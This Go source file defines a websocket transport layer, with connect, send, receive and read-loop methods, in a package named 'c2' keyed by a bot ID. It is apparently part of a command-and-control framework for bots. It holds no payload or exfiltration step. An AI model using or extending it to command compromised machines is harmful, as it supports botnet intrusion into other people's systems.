package c2

import (
	"encoding/json"
	"fmt"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

type WebSocketLayer struct {
	botID     string
	endpoint  string
	conn      *websocket.Conn
	mu        sync.Mutex
	connected bool
	done      chan struct{}
	recvCh    chan *Message
}

func NewWebSocketLayer(botID, endpoint string) *WebSocketLayer {
	return &WebSocketLayer{
		botID:    botID,
		endpoint: endpoint,
		done:     make(chan struct{}),
		recvCh:   make(chan *Message, 64),
	}
}

func (w *WebSocketLayer) Name() string { return "websocket" }

func (w *WebSocketLayer) Connect() error {
	w.mu.Lock()
	defer w.mu.Unlock()

	dialer := websocket.Dialer{HandshakeTimeout: 10 * time.Second}
	conn, _, err := dialer.Dial(w.endpoint, nil)
	if err != nil {
		return fmt.Errorf("ws dial: %w", err)
	}

	w.conn = conn
	w.connected = true
	w.done = make(chan struct{})
	go w.readLoop()
	return nil
}

func (w *WebSocketLayer) Send(msg *Message) error {
	w.mu.Lock()
	defer w.mu.Unlock()
	if !w.connected || w.conn == nil {
		return fmt.Errorf("not connected")
	}
	data, err := json.Marshal(msg)
	if err != nil {
		return err
	}
	return w.conn.WriteMessage(websocket.TextMessage, data)
}

func (w *WebSocketLayer) Receive() (*Message, error) {
	select {
	case msg := <-w.recvCh:
		return msg, nil
	case <-time.After(30 * time.Second):
		return nil, fmt.Errorf("timeout")
	}
}

func (w *WebSocketLayer) Close() error {
	w.mu.Lock()
	defer w.mu.Unlock()
	w.connected = false
	close(w.done)
	if w.conn != nil {
		return w.conn.Close()
	}
	return nil
}

func (w *WebSocketLayer) IsConnected() bool {
	w.mu.Lock()
	defer w.mu.Unlock()
	return w.connected
}

func (w *WebSocketLayer) readLoop() {
	for {
		select {
		case <-w.done:
			return
		default:
		}

		_, data, err := w.conn.ReadMessage()
		if err != nil {
			w.mu.Lock()
			w.connected = false
			w.mu.Unlock()
			return
		}

		var msg Message
		if json.Unmarshal(data, &msg) != nil {
			continue
		}

		select {
		case w.recvCh <- &msg:
		default:
		}
	}
}
